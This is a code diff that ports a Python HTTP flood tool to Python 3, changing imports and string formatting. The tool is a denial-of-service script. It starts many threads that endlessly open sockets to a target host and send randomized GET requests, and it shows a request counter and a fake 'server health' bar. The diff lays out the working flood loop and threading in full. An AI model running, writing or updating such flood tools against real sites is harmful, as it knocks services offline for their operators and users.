@@ -4,7 +4,7 @@ import argparse
 import os
 import random
 import time
-from urlparse import urlparse
+from urllib.parse import urlparse
 from colorama import Fore, Back, Style, init
 
 # Initialize colorama
@@ -15,7 +15,7 @@ TARGET_URL = ""  # Global variable to store the full URL
 TARGET_HOST = "" # Global variable to store the hostname
 TARGET_PORT = 80  # Global variable to store the port
 request_counter = 0  # Counter to track number of requests sent
- 
+
 
 def display_ascii_art():
     ascii_art = """
@@ -39,13 +39,14 @@ def http_flood(delay):
     USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket
-            s.connect((TARGET_HOST, TARGET_PORT)) # Connect to the server
-            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")) # Send GET request
-            s.send("User-Agent: {}\r\n".format(USER_AGENT).encode("utf-8")) # Send User-Agent header
-            s.send(b"\r\n") # End of headers
-            s.recv(1024) # Receive data (1024 bytes)
-            request_counter += 1 
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
+            s.connect((TARGET_HOST, TARGET_PORT))  # Connect to the server
+            request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
+            s.send(request.encode("utf-8"))  # Send GET request
+            s.send(f"User-Agent: {USER_AGENT}\r\n".encode("utf-8"))  # Send User-Agent header
+            s.send(b"\r\n")  # End of headers
+            s.recv(1024)  # Receive data (1024 bytes)
+            request_counter += 1
             s.close()
             time.sleep(delay)  # Add delay between requests
         except socket.error:
@@ -55,17 +56,17 @@ def http_flood(delay):
 def display_server_health(health):
     os.system('clear')
     display_ascii_art() 
-    print(Fore.WHITE + Style.BRIGHT + "Target URL: {}".format(TARGET_URL))  # Display the full URL
-    print(Fore.WHITE + Style.BRIGHT + "Total Requests Sent: {}".format(request_counter))
+    print(Fore.WHITE + Style.BRIGHT + f"Target URL: {TARGET_URL}")  # Display the full URL
+    print(Fore.WHITE + Style.BRIGHT + f"Total Requests Sent: {request_counter}")
     print("\n" + Fore.YELLOW + Style.BRIGHT + "SERVER HEALTH")
     print("---------------------------")
 
     if health > 75:
         color = Fore.GREEN + Style.BRIGHT  # Green color
     elif 50 < health <= 75:
-        color = Fore.YELLOW + Style.BRIGHT # Yellow color
+        color = Fore.YELLOW + Style.BRIGHT  # Yellow color
     else:
-        color = Fore.RED + Style.BRIGHT # Red color
+        color = Fore.RED + Style.BRIGHT  # Red color
 
     # Display the fake health bar
     bar_length = int(health / 5)
@@ -100,8 +101,8 @@ def main():
 
     try:
         threads = []
-        for _ in range(args.concurrent): # Create the threads
-            t = threading.Thread(target=http_flood, args=(args.delay,)) # Create a thread for each request
+        for _ in range(args.concurrent):  # Create the threads
+            t = threading.Thread(target=http_flood, args=(args.delay,))  # Create a thread for each request
             t.daemon = True  # Set thread as a daemon thread so it can be stopped easily using Ctrl+C
             t.start() 
             threads.append(t)
